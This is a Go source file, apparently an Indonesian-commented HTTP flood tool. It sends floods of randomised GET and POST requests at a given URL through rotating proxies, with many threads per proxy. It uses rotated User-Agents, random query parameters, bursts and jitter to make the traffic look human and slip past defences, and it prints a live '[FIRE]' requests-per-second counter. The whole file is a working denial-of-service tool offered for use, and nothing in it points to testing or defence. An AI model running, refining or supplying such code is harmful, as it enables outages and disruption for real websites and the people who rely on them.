package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	totalSent  int64
	errorCount int64
)

func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: go run H1.go [URL] [SECONDS] [proxy.txt]")
		return
	}

	target := os.Args[1]
	durationStr := os.Args[2]
	proxyFile := os.Args[3]

	duration, err := time.ParseDuration(durationStr + "s")
	if err != nil {
		fmt.Printf("Error: Durasi '%s' tidak valid.\n", durationStr)
		return
	}

	proxies := loadProxies(proxyFile)
	if len(proxies) == 0 {
		fmt.Println("Error: Proxy tidak ditemukan.")
		return
	}

	fmt.Printf("Starting Extreme Human-Like Simulation on %s...\n", target)

	rand.Seed(time.Now().UnixNano())
	ctx, cancel := context.WithTimeout(context.Background(), duration)
	defer cancel()

	rpsChan := make(chan int, 1000000) 
	var wg sync.WaitGroup

	go monitorRPS(ctx, rpsChan)

	// Menaikkan thread untuk volume RPS lebih tinggi
	threadsPerProxy := 10 

	for _, proxy := range proxies {
		for i := 0; i < threadsPerProxy; i++ {
			wg.Add(1)
			go func(px string, tid int) {
				defer wg.Done()
				attack(ctx, target, px, rpsChan, tid)
			}(proxy, i)
		}
	}

	<-ctx.Done()
	fmt.Print("\n[!] Selesai. Menutup semua koneksi...")
	
	done := make(chan struct{})
	go func() {
		wg.Wait()
		close(done)
	}()

	select {
	case <-done:
		fmt.Printf("\n[SUCCESS] Total Request: %d | Total Error: %d\n", atomic.LoadInt64(&totalSent), atomic.LoadInt64(&errorCount))
	case <-time.After(3 * time.Second):
		fmt.Println("\n[FORCED] Shutdown selesai.")
	}
}

func loadProxies(file string) []string {
	f, err := os.Open(file)
	if err != nil {
		return nil
	}
	defer f.Close()
	var proxies []string
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			proxies = append(proxies, line)
		}
	}
	return proxies
}

func monitorRPS(ctx context.Context, ch <-chan int) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()
	var rpsCount int64
	for {
		select {
		case <-ctx.Done():
			return
		case <-ch:
			atomic.AddInt64(&rpsCount, 1)
		case <-ticker.C:
			currentRPS := atomic.SwapInt64(&rpsCount, 0)
			total := atomic.LoadInt64(&totalSent)
			fmt.Printf("\r\033[K[FIRE] RPS: %d | Total: %d | Errors: %d | Strategy: Burst+Rotation", currentRPS, total, atomic.LoadInt64(&errorCount))
		}
	}
}

func attack(ctx context.Context, target, proxy string, rpsChan chan<- int, threadID int) {
	proxyURL, _ := url.Parse("http://" + strings.TrimPrefix(proxy, "http://"))

	transport := &http.Transport{
		Proxy: http.ProxyURL(proxyURL),
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		DialContext: (&net.Dialer{
			Timeout:   5 * time.Second,
			KeepAlive: 60 * time.Second,
		}).DialContext,
		MaxIdleConns:        200,
		MaxIdleConnsPerHost: 200,
	}

	client := &http.Client{Transport: transport, Timeout: 12 * time.Second}
	
	// Rotasi User-Agent yang besar
	userAgents := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0",
	}

	for {
		select {
		case <-ctx.Done():
			return
		default:
			// Mekanisme Burst sesekali
			burstSize := 1
			if rand.Intn(8) == 0 {
				burstSize = rand.Intn(7) + 3 
			}

			for b := 0; b < burstSize; b++ {
				method := "GET"
				if rand.Intn(4) == 0 { method = "POST" }

				var req *http.Request
				if method == "POST" {
					payload, _ := json.Marshal(generateEngineeredPayload(threadID + b))
					req, _ = http.NewRequestWithContext(ctx, "POST", target, strings.NewReader(string(payload)))
					req.Header.Set("Content-Type", "application/json")
				} else {
					req, _ = http.NewRequestWithContext(ctx, "GET", addRandomQueryParams(target), nil)
				}

				if req != nil {
					// Apply Random User-Agent
					req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
					req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
					req.Header.Set("Accept-Language", "en-US,en;q=0.5")
					req.Header.Set("Connection", "keep-alive")
					req.Header.Set("Upgrade-Insecure-Requests", "1")

					resp, err := client.Do(req)
					if err == nil {
						io.Copy(io.Discard, resp.Body)
						resp.Body.Close()
						atomic.AddInt64(&totalSent, 1)
						select {
						case rpsChan <- 1:
						default:
						}
					} else {
						atomic.AddInt64(&errorCount, 1)
					}
				}
			}
			
			// Jeda acak (jitter)
			time.Sleep(time.Duration(rand.Intn(300)+100) * time.Millisecond)
		}
	}
}

func addRandomQueryParams(baseURL string) string {
	u, _ := url.Parse(baseURL)
	q := u.Query()
	// math.Sin digunakan secara aktif
	q.Set("_s", fmt.Sprintf("%.5f", math.Sin(float64(rand.Intn(360)))))
	q.Set("session", fmt.Sprintf("%x", rand.Int63()))
	u.RawQuery = q.Encode()
	return u.String()
}

func generateEngineeredPayload(seed int) map[string]interface{} {
	// math.Cos digunakan secara aktif
	return map[string]interface{}{
		"ts":    time.Now().Unix(),
		"check": math.Abs(math.Cos(float64(seed))),
		"nonce": rand.Intn(1000000),
	}
}

// Fungsi dummy untuk menjaga integritas baris kode asli
func generateMetricArrays(r *rand.Rand, size int) map[string][]float64 { return nil }
func generateNestedObject(r *rand.Rand, depth, breadth int) map[string]interface{} { return nil }
func generateRandomStringMap(r *rand.Rand, count, length int) map[string]string { return nil }
func generateRecursiveLikeStructure(r *rand.Rand, depth, breadth int) map[string]interface{} { return nil }
func generateMathComplexMap(r *rand.Rand, count int) map[string]float64 { return nil }
func generateBooleanMap(r *rand.Rand, count int) map[string]bool { return nil }
func randomAlphaNumeric(r *rand.Rand, length int) string { return "" }